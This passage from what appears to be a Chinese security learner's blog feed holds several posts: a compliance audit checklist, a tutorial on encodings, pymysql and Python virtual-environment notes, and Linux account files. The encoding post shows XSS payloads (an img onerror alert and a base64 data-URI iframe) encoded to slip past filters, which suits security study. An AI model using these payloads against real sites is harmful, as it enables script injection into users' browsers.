title="a）应保证鉴别信息所在的存储空间被释放或重新分配前得到完全清除"></a>a）应保证鉴别信息所在的存储空间被释放或重新分配前得到完全清除</h2><p>测试用户退出登录后，按后退按钮能否访问之前的页面；</p><p>关闭浏览器或客户端后再次打开系统，看是否留存有上次登录的身份鉴别信息。若没有留存为符合。</p><h3 id="高风险-13"><a href="#高风险-13" class="headerlink" title="高风险"></a>高风险</h3><p>留存身份鉴别信息且没有其他措施降低风险的，视为高风险项。</p><p><img src="/img/20230808111836.png"></p><h2 id="b）应保证存有敏感数据的存储空间被释放或重新分配前得到完全清除"><a href="#b）应保证存有敏感数据的存储空间被释放或重新分配前得到完全清除" class="headerlink" title="b）应保证存有敏感数据的存储空间被释放或重新分配前得到完全清除"></a>b）应保证存有敏感数据的存储空间被释放或重新分配前得到完全清除</h2><p>测试应用系统，用某用户登录系统并进行操作，在该用户退出后用另一用户登录，试图操作(读取、修改或删除等)其他用户产生的文件、目录和数据库记录等资源，查看是否成功，验证系统提供的剩余信息保护功能是否正确(确保系统内文件、目录和数据库记录等资源所在的存储空间被释放或重新分配给其他用户前得到完全清除) 。</p><p>检查用户退出应用系统(正常退出和非强制关闭)后，应用系统和操作系统临时文件(IE临时文件目录、用户cookies目录、temp目录等)中是否有残留的用户敏感信息(如网上银行访问后在E临时目录里可以找到查询资金余额页面的相关敏感信息)。</p><h3 id="高风险-14"><a href="#高风险-14" class="headerlink" title="高风险"></a>高风险</h3><p>对于三级及以上系统，退出登录后留存有敏感数据的，高风险。</p><p><img src="/img/20230808112225.png"></p><h1 id="九、个人信息保护"><a href="#九、个人信息保护" class="headerlink" title="九、个人信息保护"></a>九、个人信息保护</h1><h2 id="a）应仅采集和保存业务必需的用户个人信息"><a href="#a）应仅采集和保存业务必需的用户个人信息" class="headerlink" title="a）应仅采集和保存业务必需的用户个人信息"></a>a）应仅采集和保存业务必需的用户个人信息</h2><p>访谈业务人员了解系统收集和保存哪些个人信息，并在系统中确认相关情况；</p><p>核查有关用户个人信息保护的管理制度、用户协议书和流程，查看与系统是否保持一致。</p><p>在结果记录中，写系统收集了哪些个人信息，例如：姓名、电话等；如果该应用系统没有收集个人信息，标记为不适用项。</p><h3 id="高风险-15"><a href="#高风险-15" class="headerlink" title="高风险"></a>高风险</h3><p>一般应用系统采集的都是业务必需的个人信息，很少有违规采集的。</p><p><img src="/img/20230808112801.png"></p><h2 id="b）应禁止未授权访问和非法使用用户个人信息"><a href="#b）应禁止未授权访问和非法使用用户个人信息" class="headerlink" title="b）应禁止未授权访问和非法使用用户个人信息"></a>b）应禁止未授权访问和非法使用用户个人信息</h2><p>访谈业务人员了解系统如何授权访问个人信息，并在系统中确认相关情况；</p><p>核查有关用户个人信息保护的管理制度、用户协议书和流程，查看与系统是否保持一致。</p><p>一般应用系统都是通过访问控制功能限制非管理员账户无法访问用户个人信息，只有管理员可以访问这些信息；</p><p>有些单位会制定有保密协议条款，协议中有对个人信息的保密规定。</p><h3 id="高风险-16"><a href="#高风险-16" class="headerlink" title="高风险"></a>高风险</h3><p>对于收集到的个人信息要严格管理。</p><p><img src="/img/20230808113032.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 等保 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一些编码</title>
      <link href="/2023/06/25/%E4%B8%80%E4%BA%9B%E7%BC%96%E7%A0%81/"/>
      <url>/2023/06/25/%E4%B8%80%E4%BA%9B%E7%BC%96%E7%A0%81/</url>
      
        <content type="html"><![CDATA[<h1 id="1-页面编码"><a href="#1-页面编码" class="headerlink" title="1 页面编码"></a>1 页面编码</h1><p>常用的有三种格式分别是 <code>utf-8</code>、<code>gbk</code>、<code>gbk2312</code>。</p><h1 id="2-ASCII-编码"><a href="#2-ASCII-编码" class="headerlink" title="2 ASCII 编码"></a>2 ASCII 编码</h1><p><strong>介绍</strong></p><p>​<code>ASCII</code> (<code>American Standard Code for Information Interchange</code>，美国信息交换标准代码）是基于拉丁字母的一套电脑编码系统。它主要用于显示现代英语，而其扩展版本延伸美国标准信息交换码则可以部分支持其他西欧语言，并等同于国际标准<code>ISO/IEC 646</code>。</p><p>​<code>1968</code>年版<code>ASCI</code>I编码速见表 美国信息交换标准代码是这套编码系统的传统命名，互联网号码分配局现在更倾向于使用它的新名字<code>US-ASCII</code>。</p><p>​美国信息交换标准代码是美国电气和电子工程师协会里程碑之一。</p><p>​<code>ASCII</code>由电报码发展而来。第一版标准发布于<code>1963</code>年，<code>1967</code>年经历了一次主要修订，最后一次更新则是在<code>1986</code>年，至今为止共定义了<code>128</code>个字符；其中<code>33</code>个字符无法显示（一些终端提供了扩展，使得这些字符可显示为诸如笑脸、扑克牌花式等<code>8-bit</code>符号），且这33个字符多数都已是陈废的控制字符。控制字符的用途主要是用来操控已经处理过的文字。在<code>33</code>个字符之外的是<code>95</code>个可显示的字符。用键盘敲下空白键所产生的空白字符也算1个可显示字符（显示为空白）。</p><p><img src="/img/20220615200551.png"></p><h1 id="3-HTML-编码"><a href="#3-HTML-编码" class="headerlink" title="3 HTML 编码"></a>3 HTML 编码</h1><p><strong>介绍</strong></p><p>​在编写<code>HTML</code>的时候，可能会出现我们想要页面输出的内容恰好和<code>HTML</code>语法的规则冲突，导致该显示的文本内容被浏览器当作了标签，进而被构造成了页面结构。因此产生了实体字符这个东西，当浏览器解析到实体字符以后，就不会把它当成页面结构，而是转换成对应的字符展示到页面上。</p><p>​实体名称：构造是<code>&amp;</code> + 希腊字母 + <code>;</code>。</p><p>​实体编号：是<code>&amp;#</code> + ascii码+ <code>;</code> 构成，作用和实体名称相同。</p><p><a href="http://www.qqxiuzi.cn/bianma/zifushiti.php">HTML实体转换</a> </p><p><img src="/img/20220615200824.png"></p><p><code>十六进制</code>、<code>ASCII码</code> 或 <code>unicode字符编码</code>，浏览器解析的时候会先把html编码解析再进行渲染。但是有个前提就是必须要在“值”里，比如属性<code>src</code>里，但却不能对<code>src</code>进行html编码。不然浏览器无法正常的渲染。</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">十六进制</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&amp;#x68;&amp;#x74;&amp;#x74;&amp;#x70;&amp;#x73;&amp;#x3a;&amp;#x2f;&amp;#x2f;&amp;#x77;&amp;#x77;&amp;#x77;&amp;#x2e;&amp;#x62;&amp;#x61;&amp;#x69;&amp;#x64;&amp;#x75;&amp;#x2e;&amp;#x63;&amp;#x6f;&amp;#x6d;&amp;#x2f;&amp;#x69;&amp;#x6d;&amp;#x67;&amp;#x2f;&amp;#x62;&amp;#x64;&amp;#x5f;&amp;#x6c;&amp;#x6f;&amp;#x67;&amp;#x6f;&amp;#x31;&amp;#x2e;&amp;#x70;&amp;#x6e;&amp;#x67;</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/img/20220615201611.png"></p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">十进制</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#115;&amp;#58;&amp;#47;&amp;#47;&amp;#119;&amp;#119;&amp;#119;&amp;#46;&amp;#98;&amp;#97;&amp;#105;&amp;#100;&amp;#117;&amp;#46;&amp;#99;&amp;#111;&amp;#109;&amp;#47;&amp;#105;&amp;#109;&amp;#103;&amp;#47;&amp;#98;&amp;#100;&amp;#95;&amp;#108;&amp;#111;&amp;#103;&amp;#111;&amp;#49;&amp;#46;&amp;#112;&amp;#110;&amp;#103;</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/img/20220615201719.png"></p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">xss</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;<span class="symbol">&amp;#97;</span><span class="symbol">&amp;#108;</span><span class="symbol">&amp;#101;</span><span class="symbol">&amp;#114;</span><span class="symbol">&amp;#116;</span><span class="symbol">&amp;#40;</span><span class="symbol">&amp;#49;</span><span class="symbol">&amp;#41;</span>&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/img/20220615201844.png"></p><h1 id="4-URL-编码"><a href="#4-URL-编码" class="headerlink" title="4 URL 编码"></a>4 URL 编码</h1><p><strong>介绍</strong></p><p>​百分号编码（英语：<code>Percent-encoding</code>）又称：<code>URL</code>编码（<code>URL encoding</code>），是特定上下文的统一资源定位符 （<code>URL</code>）的编码机制，实际上也适用于统一资源标志符（<code>URI</code>）的编码。也用于为 <code>application/x-www-form-urlencoded MIME</code>准备数据，因为它用于通过<code>HTTP</code>的请求操作（<code>request</code>）提交<code>HTML</code>表单数据。</p><p>​URL编码的最基本表示方式是，使用字符的十六进制ASCII编码来替换它们，并在ASCII编码前加%。例如，<code>单引号</code>字符的ASCII码为0x27，其URL编码的表示方式为%27。</p><p>在<code>BurpSuite</code>的Repeater模块中选中一段文本，右键，下面这个URL - encode key characters就是URL转码，URL - decode是解码。</p><p><img src="/img/20220615202753.png"></p><p>在Decoder模块也可以进行URL编码。</p><p><img src="/img/20220615203636.png"></p><h1 id="5-十六进制编码"><a href="#5-十六进制编码" class="headerlink" title="5 十六进制编码"></a>5 十六进制编码</h1><p><a href="http://www.jb51.net/tools/zhuanhuan.htm">JavaScript在线转码</a> </p><p>把这一段文本转码：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="string">&quot;Hello world!&quot;</span>);&lt;/script&gt;</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">javascript的十六进制编码</span><br><span class="line">\x3C\x73\x63\x72\x69\x70\x74\x3E\x61\x6C\x65\x72\x74\x28\x22\x48\x65\x6C\x6C\x6F\x20\x77\x6F\x72\x6C\x64\x21\x22\x29\x3B\x3C\x2F\x73\x63\x72\x69\x70\x74\x3E</span><br></pre></td></tr></table></figure><p><img src="/img/20220615204643.png"></p><p>点击16进制解码后：</p><p><img src="/img/20220615204739.png"></p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">javascript的八进制编码 </span><br><span class="line">\<span class="number">74</span>\<span class="number">163</span>\<span class="number">143</span>\<span class="number">162</span>\<span class="number">151</span>\<span class="number">160</span>\<span class="number">164</span>\<span class="number">76</span>\<span class="number">141</span>\<span class="number">154</span>\<span class="number">145</span>\<span class="number">162</span>\<span class="number">164</span>\<span class="number">50</span>\<span class="number">42</span>\<span class="number">110</span>\<span class="number">145</span>\<span class="number">154</span>\<span class="number">154</span>\<span class="number">157</span>\<span class="number">40</span>\<span class="number">167</span>\<span class="number">157</span>\<span class="number">162</span>\<span class="number">154</span>\<span class="number">144</span>\<span class="number">41</span>\<span class="number">42</span>\<span class="number">51</span>\<span class="number">73</span>\<span class="number">74</span>\<span class="number">57</span>\<span class="number">163</span>\<span class="number">143</span>\<span class="number">162</span>\<span class="number">151</span>\<span class="number">160</span>\<span class="number">164</span>\<span class="number">76</span></span><br></pre></td></tr></table></figure><p>8进制与16进制同理。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">javascript unicode编码</span><br><span class="line">\u003c\u0073\u0063\u0072\u0069\u0070\u0074\u003e\u0061\u006c\u0065\u0072\u0074\u0028\u0022\u0048\u0065\u006c\u006c\u006f\u0020\u0077\u006f\u0072\u006c\u0064\u0021\u0022\u0029\u003b\u003c\u002f\u0073\u0063\u0072\u0069\u0070\u0074\u003e\u0020</span><br></pre></td></tr></table></figure><p><a href="http://www.msxindl.com/tools/unicode16.asp">Unicode转换</a> </p><p><img src="/img/20220615205800.png"></p><p>也可以把汉字转换成Unicode编码。</p><p><img src="/img/20220615210218.png"></p><p>Burp Suite也提供了<code>unicode</code> 转码。</p><p><img src="/img/20220615205206.png"></p><h1 id="6-hex-编码"><a href="#6-hex-编码" class="headerlink" title="6 hex 编码"></a>6 hex 编码</h1><p>这种编码常用于数据库中 转码过后要加上0x</p><p>例如 a的hex码是61 如果在数据库使用要加上0x61，与十六进制0x61转成十进制是97，是ASCII码中a的十进制。</p><p><img src="/img/20220615210813.png"></p><p><img src="/img/20220615211152.png"></p><p>使用python函数<code>ord()</code>查看a的ASCII编码值。</p><p><img src="/img/20220615211902.png"></p><h1 id="7-base64-编码"><a href="#7-base64-编码" class="headerlink" title="7 base64 编码"></a>7 base64 编码</h1><p>BASE64 编码是一种常用的字符编码，在很多地方都会用到。</p><p>但base64不是安全领域下的加密解密算法。能起到安全作用的效果很差，而且很容易破解，他核心作用应该是传输数据的正确性，有些网关或系统只能使用ASCII字符。</p><p>Base64就是用来将非ASCII字符的数据转换成ASCII字符的一种方法，而且base64特别适合在http，mime协议下快速传输数据。</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&#x27;data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&#x27;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>解码：</p><p><img src="/img/20220615212359.png"></p><h1 id="8-UTF-7-编码"><a href="#8-UTF-7-编码" class="headerlink" title="8 UTF-7 编码"></a>8 UTF-7 编码</h1><p>UTF-7 (7-位元 Unicode 转换格式（Unicode Transformation Format，简写成 UTF））是一种可变长度字符编码方式， 用以将 Unicode 字符以 ASCII 编码的字符串来呈现，可以应用在电子邮件传输之类的应用。</p><p><a href="https://web2hack.org/xssee/">UTF-7编码</a> </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Typora</span><br><span class="line">+AFQAeQBwAG8AcgBh-</span><br></pre></td></tr></table></figure><p><img src="/img/20220615214204.png"></p><p>解码：</p><p><img src="/img/20220615214303.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 编码 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pymysql</title>
      <link href="/2023/06/01/python-pymysql/"/>
      <url>/2023/06/01/python-pymysql/</url>
      
        <content type="html"><![CDATA[<h1 id="pymysql的简单使用"><a href="#pymysql的简单使用" class="headerlink" title="pymysql的简单使用"></a>pymysql的简单使用</h1><p>pip install pymysql #安装</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pymysql</span><br><span class="line"></span><br><span class="line"><span class="comment">#DB-API规范的方法:connect() 连接函数，生成一个connect对象，以提供数据库操作。</span></span><br><span class="line">conn = pymysql.connect(host=<span class="string">&quot;127.0.0.1&quot;</span>,user=<span class="string">&quot;root&quot;</span>,password=<span class="string">&quot;123456&quot;</span>,db=<span class="string">&quot;数据库名&quot;</span>)</span><br><span class="line"></span><br><span class="line">cursor = conn.cursor() <span class="comment">#创建游标</span></span><br><span class="line">sql = <span class="string">&quot;sql语句&quot;</span> <span class="comment">#写一个SQL语句</span></span><br><span class="line">cursor.execute(sql) <span class="comment">#执行SQL语句，执行结果存到游标中</span></span><br><span class="line"><span class="comment">#conn.commit() #提交事务</span></span><br><span class="line">res = cursor.fetchall() <span class="comment">#读取游标中结果集的所有行</span></span><br><span class="line"><span class="built_in">print</span>(res)</span><br><span class="line"></span><br><span class="line">cursor.close()<span class="comment">#关闭游标</span></span><br><span class="line">conn.close()<span class="comment">#关闭数据库连接</span></span><br></pre></td></tr></table></figure><p>插入数据：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pymysql</span><br><span class="line"></span><br><span class="line">conn = pymysql.connect(host=<span class="string">&quot;127.0.0.1&quot;</span>,user=<span class="string">&quot;root&quot;</span>,password=<span class="string">&quot;123456&quot;</span>,db=<span class="string">&quot;数据库名&quot;</span>)</span><br><span class="line">cursor = conn.cursor()</span><br><span class="line">sql = <span class="string">&quot;insert into history values(%s,%s,%s,%s,%s,%s,%s,%s,%s)&quot;</span></span><br><span class="line">cursor.execute(sql,[time.strftime(<span class="string">&quot;%Y-%m-%d&quot;</span>),<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>])<span class="comment">#用[]包含九个数据，对应上一步的九个%s占位符，其中第一个数据是日期时间数据，strftime是数据表中的字段名</span></span><br><span class="line">conn.commit()<span class="comment">#提交事务</span></span><br><span class="line"><span class="comment">#res = cursorfetchall()</span></span><br><span class="line">cursor.close()</span><br><span class="line">conn.close()</span><br></pre></td></tr></table></figure><h2 id="connect"><a href="#connect" class="headerlink" title="connect()"></a>connect()</h2><p><strong>DB-API规范的方法:</strong></p><p>connect() 连接函数，生成一个connect对象，以提供数据库操作，同事函数参数也是固定好的</p><p>其中connect对象又有如下方法:</p><ul><li>close():关闭此connect对象, 关闭后无法再进行操作，除非再次创建连接</li><li>commit():提交当前事务，如果是支持事务的数据库执行增删改后没有commit则数据库默认回滚，白操作了</li><li>rollback():取消当前事务</li><li>cursor():创建游标对象</li><li>其中cursor游标对象又有如下属性和方法:<ul><li>close() #关闭此游标对象</li><li>fetchone() #得到结果集的下一行</li><li>fetchmany([size &#x3D; cursor.arraysize]) #得到结果集的下几行</li><li>fetchall() #得到结果集中剩下的所有行</li><li>excute(sql[, args]):执行一个数据库查询或命令</li><li>excutemany(sql, args):执行多个数据库查询或命令</li><li>常用属性:<ul><li>connection:创建此游标对象的数据库连接</li><li>arraysize:使用fetchmany()方法一次取出多少条记录，默认为1</li><li>lastrowid:相当于PHP的last_inset_id()</li></ul></li></ul></li></ul><p>所谓事务可以认为是一整套操作 只要有一处纰漏就废。</p><h2 id="游标"><a href="#游标" class="headerlink" title="游标"></a>游标</h2><p>游标，通俗的解释就是”游动的标志”，这是数据库中一个很重要的概念。</p><p>有时候，我们执行一条查询语句的时候，往往会得到N条返回结果，<strong>执行sql语句取出这些返回结果的接口(起始点)，就是游标</strong>。沿着这个游标，我们可以一次取出一行记录。</p><p>当不使用游标功能，我们去执行 select * from student where age &gt; 20; 这条语句的时候，如果有1000条返回结果，系统会一次性将1000条记录返回到界面中，你没有选择，也不能做其他操作。</p><p><strong>当我们开启了游标功能，再去执行这条语句的时候，系统会先帮你找到这些行， 先给你存放起来，然后提供了一个游标接口</strong>。当你需要数据的时候，就借助这个游标去一行行的取出数据，你每取出一条记录，游标指针就朝前移动一次，一直到取完最后一行数据后。</p><p>一张图讲述游标的功能：</p><p><img src="http://img.qianmingchao.top/img/20230312161920.png"></p><h2 id="使用游标的好处？"><a href="#使用游标的好处？" class="headerlink" title="使用游标的好处？"></a>使用游标的好处？</h2><p>​    <strong>如果不使用游标功能，直接使用select查询，会一次性将结果集打印到屏幕上，你无法针对结果集做第二次编程。</strong></p><p>​    使用游标功能后，我们可以将得到的结果先保存起来，然后可以随意进行自己的编程，得到我们最终想要的结果集。</p><h1 id="利用python连接数据库"><a href="#利用python连接数据库" class="headerlink" title="利用python连接数据库"></a>利用python连接数据库</h1><h2 id="以python连接mysql"><a href="#以python连接mysql" class="headerlink" title="以python连接mysql"></a>以python连接mysql</h2><p>​    使用python连接数据库的时候，会经常使用游标这个功能。我们以python连接mysql数据库来说明使用游标的好处。</p><p>​    当我们使用python连接mysql的时候，那么python就相当于是mysql服务器的一个客户端，我们利用python这个client去操纵mysql的server。</p><p>​    在pymysql中操作数据库，就是使用游标这种方式来获取表中的数据。</p><h2 id="使用游标的操作步骤"><a href="#使用游标的操作步骤" class="headerlink" title="使用游标的操作步骤"></a>使用游标的操作步骤</h2><p>​    首先，使用pymysql连接上mysql数据库，得到一个数据库对象。</p><p>​    然后，我们必须要开启数据库中的游标功能，得到一个游标对象。</p><p>​    接着，使用游标对象中的execute()方法，去执行某个SQL语句，系统会根据你的SQL语句，找到这些匹配行，给你存储起来，而不是一次性的打印到屏幕上。什么时候需要这个结果中的数据的时候，你就去获取它。</p><p>​    最后，就是获取结果集中的数据了，这里有两种方法获取结果集中的数据。一个是fetchone()，该方法一次获取一条记录，每一条记录是一个元组形式的数据，每获取一条记录游标会往前移动一格，等待获取下一条记录；一个是fetchall()方法，能够一次性的获取所有的数据，该方法返回的是一个元组列表。</p><p>​    当完成所有操作后，记得断开数据库的连接，释放资源。</p>]]></content>
      
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python虚拟环境</title>
      <link href="/2023/06/01/python%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83/"/>
      <url>/2023/06/01/python%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83/</url>
      
        <content type="html"><![CDATA[<h1 id="venv"><a href="#venv" class="headerlink" title="venv"></a>venv</h1><p>它是自 3.3 版本之后添加的官方库，venv只能使用当前系统已经安装好的python，无法使用其他版本的python环境。</p><p>创建虚拟环境：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python -m venv E:\Download\GoogleDownload\项目文件夹\venv</span><br></pre></td></tr></table></figure><h1 id="pyenv"><a href="#pyenv" class="headerlink" title="pyenv"></a>pyenv</h1><p>pyenv 只用来安装不同版本的python，virtualenv 用来建造虚拟环境。</p><p><a href="https://blog.csdn.net/weixin_42289080/article/details/127997003">https://blog.csdn.net/weixin_42289080/article/details/127997003</a></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pyenv versions #列出所有版本和当前使用的版本</span><br><span class="line">pyenv version #显示当前使用的版本</span><br><span class="line">pyenv install --list #列出所有可以安装的版本</span><br><span class="line">pyenv install 3.7.0  #安装3.7.0</span><br><span class="line">pyenv global 3.7.0   #设置全局版本为3.7.0</span><br><span class="line">pyenv uninstall &lt;version&gt; #卸载指定版本</span><br><span class="line">pyenv local &lt;version&gt; #设置本地版本，只影响使用此条命令的cmd窗口文件夹</span><br></pre></td></tr></table></figure><p>由于python官网下载太慢，镜像站：<a href="https://registry.npmmirror.com/binary.html?path=python">https://registry.npmmirror.com/binary.html?path=python</a></p><p>加速的两种方法：</p><ol><li>把D:\pyenv\pyenv-win.versions_cache.xml文件中的<a href="https://www.python.org/ftp/python%E5%85%A8%E9%83%A8%E6%9B%BF%E6%8D%A2%E4%B8%BAhttps://registry.npmmirror.com/binary.html?path=python%E3%80%82%E7%84%B6%E5%90%8E%E5%B0%86D:%5Cpyenv%5Cpyenv-win%5Clibexec%5Clibs%5Cpyenv-install-lib.vbs%E6%96%87%E4%BB%B6%E4%B8%AD%E7%9A%84https://www.python.org/ftp/python%E5%85%A8%E9%83%A8%E6%9B%BF%E6%8D%A2%E4%B8%BAhttps://registry.npmmirror.com/binary.html?path=python%E3%80%82%E7%84%B6%E5%90%8E%E6%89%A7%E8%A1%8Cpyenv">https://www.python.org/ftp/python全部替换为https://registry.npmmirror.com/binary.html?path=python。然后将D:\pyenv\pyenv-win\libexec\libs\pyenv-install-lib.vbs文件中的https://www.python.org/ftp/python全部替换为https://registry.npmmirror.com/binary.html?path=python。然后执行pyenv</a> install 3.7.0。</li><li>直接浏览器下载<a href="https://registry.npmmirror.com/-/binary/python/3.7.0/python-3.7.0-amd64.exe%EF%BC%8C%E7%84%B6%E5%90%8E%E6%94%BE%E5%85%A5D:/pyenv/pyenv-win/install_cache%EF%BC%8C%E6%B2%A1%E6%9C%89install_cache%E5%B0%B1%E6%89%8B%E5%8A%A8%E5%88%9B%E5%BB%BA%E4%B8%80%E4%B8%AA%EF%BC%8C%E7%84%B6%E5%90%8E%E6%89%A7%E8%A1%8Cpyenv">https://registry.npmmirror.com/-/binary/python/3.7.0/python-3.7.0-amd64.exe，然后放入D:\pyenv\pyenv-win\install_cache，没有install_cache就手动创建一个，然后执行pyenv</a> install 3.7.0。</li></ol><p>我使用的第二个方法：</p><p><img src="/img/20230312103906.png"></p><p>安装完毕在D:\pyenv\pyenv-win\versions\3.7.0</p><h1 id="virtualenv"><a href="#virtualenv" class="headerlink" title="virtualenv"></a>virtualenv</h1><p>virtualenv 是目前最流行的 python 虚拟环境配置工具。它不仅同时支持 python2 和 python3，而且可以为每个虚拟环境指定 python 解释器，并可以选择继承基础版本的包。</p><p>virtualenv 可以说是 venv 的增强版本，不过早在 venv 出现之前，virtualenv 就算是最受欢迎的命令行环境管理工具了。venv 的许多特性也是借鉴的 virtualenv，相比于 venv，其强大之处主要在：</p><ul><li>更快</li><li>扩展性更强</li><li>自动发现并可创建多版本的 Python 环境</li><li>可通过 pip 更新</li><li>丰富的编程接口</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pip install virtualenv <span class="comment">#安装</span></span><br><span class="line">virtualenv -p D:\pyenv\pyenv-win\versions\<span class="number">3.7</span><span class="number">.0</span>\python.exe E:\Download\GoogleDownload\项目文件夹\myenv <span class="comment">#创建虚拟环境</span></span><br><span class="line">activate <span class="comment">#在E:\Download\GoogleDownload\bilibili_master-master\myenv\Scripts目录执行，进入虚拟环境.</span></span><br><span class="line">source activate <span class="comment">#如果是linux用这个命令</span></span><br><span class="line">activate.bat <span class="comment">#进入虚拟环境</span></span><br><span class="line">deactivate <span class="comment">#退出虚拟环境</span></span><br></pre></td></tr></table></figure><p>pycharm选择virtualenv虚拟环境，出现python解释器无效的问题的解决方法：</p><p><img src="/img/20230312112311.png"></p><p><img src="/img/20230312112350.png"></p><p>用减号把无效的虚拟环境删除，然后重新添加即可。</p>]]></content>
      
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux常用配置文件</title>
      <link href="/2023/05/21/linux%E5%B8%B8%E7%94%A8%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6/"/>
      <url>/2023/05/21/linux%E5%B8%B8%E7%94%A8%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6/</url>
      
        <content type="html"><![CDATA[<h1 id="1-用户相关"><a href="#1-用户相关" class="headerlink" title="1. 用户相关"></a>1. 用户相关</h1><h2 id="1-1-etc-passwd-文件"><a href="#1-1-etc-passwd-文件" class="headerlink" title="1.1 &#x2F;etc&#x2F;passwd 文件"></a>1.1 &#x2F;etc&#x2F;passwd 文件</h2><p><code>/etc/passwd</code>文件中保存的就是系统中所有的用户和用户的主要信息，这个文件的内容非常规律，每行代表一个用户。</p><p><img src="/img/20220829221210.png"></p><p>每一行有七个字段，以：为分隔符，每个字段所代表的含义不同。</p><ul><li><p>第一个字段为：用户名名称</p></li><li><p>第二字段为：密码表示，但是不是真正的密码，密码是在另一个文件当中，在早期的unix中，这里保存的就是真正的加密后的密码字符串</p></li><li><p>第三个字段为：UID，也就是用户的ID</p></li><li><p>第四字段为：GID，也称为用户的组ID</p></li><li><p>第五个字段为：用户的说明</p></li><li><p>第六个字段为：用户的家目录</p></li><li><p>第七个字段为：shell,也可以理解为用户登录之后所拥有的权限，比如 kali 的 zsh 解释器会提示输入过的命令，最好换成 &#x2F;bin&#x2F;bash。</p></li></ul><p>nologin 表示不允许登录，一般都是服务类型的用户，例如 Nginx、Apache 等。</p><h2 id="1-2-etc-shadow-文件"><a href="#1-2-etc-shadow-文件" class="headerlink" title="1.2 &#x2F;etc&#x2F;shadow 文件"></a>1.2 &#x2F;etc&#x2F;shadow 文件</h2><p><code>/etc/shadow</code>是用户保存密码的文件。</p><p>这个文件的每行代表一个用户，同样的也是以 <code>:</code> 为分隔符。</p><p><img src="/img/20220829225703.png"></p><p><code>/etc/shadow</code>这个文件有九个字段。</p><ul><li>第一字段为：用户名称。</li><li>第二个字段为：该用户加密后的密码，*表示账户被锁定，!!表示没有设置密码或密码已过期，如果为空则是空口令账户。</li><li>第三个字段为：密码何时修改过，这里显示的数字是从1970 年 1 日 1 日作为标准时间算的，每过去一天时间戳加1.如果是10000的话，那么就是1970年1月1日后的第10000天，此处为空表示还没修改过密码。</li><li>第四个字段为：两次修改密码的时间间隔，如果是5，那么密码修改后5天内不能再更改，为0的话，是随时都可修改。</li><li>第五个字段为：密码的有效期，是从第三字段之后开始算的，默认是99999，比如一个外包需要临时账号，可以设定一个期限。</li><li>第六个字段为：密码到期修改前的警告天数，根据第五个字段算的，默认为7，则是到期前的7天开始警告</li><li>第七个字段为：密码到期后的宽限天数，为0是到期立马失效，-1是永远不失效。</li><li>第八个字段为：用户失效的时间，同样是以时间戳表示的。</li><li>第九个字段：这个字段暂时没有功能。</li></ul><h2 id="1-3-etc-group-文件"><a href="#1-3-etc-group-文件" class="headerlink" title="1.3 &#x2F;etc&#x2F;group 文件"></a>1.3 &#x2F;etc&#x2F;group 文件</h2><p>linux用户组的所有信息都存放在<code>/etc/group</code>文件当中，也就是passwd文件中GID的来源。</p><p><img src="/img/20220901202108.png"></p><p><code>/etc/group</code>这个文件分为四个字段，也是以：为分隔符</p><ul><li>第一个字段：用户组名称</li><li>第二个字段：用户组密码</li><li>第三个字段：对应的GID</li><li>第四个字段：用户列表，本字段可以为空</li></ul><h2 id="1-4-etc-gshadow文件"><a href="#1-4-etc-gshadow文件" class="headerlink" title="1.4 &#x2F;etc&#x2F;gshadow文件"></a>1.4 &#x2F;etc&#x2F;gshadow文件</h2><p>组用户信息存储在 <code>/etc/group</code> 文件中，而将组用户的密码信息存储在  <code>/etc/gshadow</code> 文件中。</p><p>文件中，每行代表一个组用户的密码信息，各行信息用 “:” 作为分隔符分为 4 个字段，每个字段的含义如下：</p><p><img src="/img/20220901202336.png"></p><ul><li>第一个字段：用户组名称</li><li>第二个字段：用户组密码，通常不会设置</li><li>第三个字段：组管理员</li><li>第四个字段：组附加用户列表，本字段可以为空</li></ul><h2 id="1-5-etc-sudoers-文件"><a href="#1-5-etc-sudoers-文件" class="headerlink" title="1.5 &#x2F;etc&#x2F;sudoers 文件"></a>1.5 &#x2F;etc&#x2F;sudoers 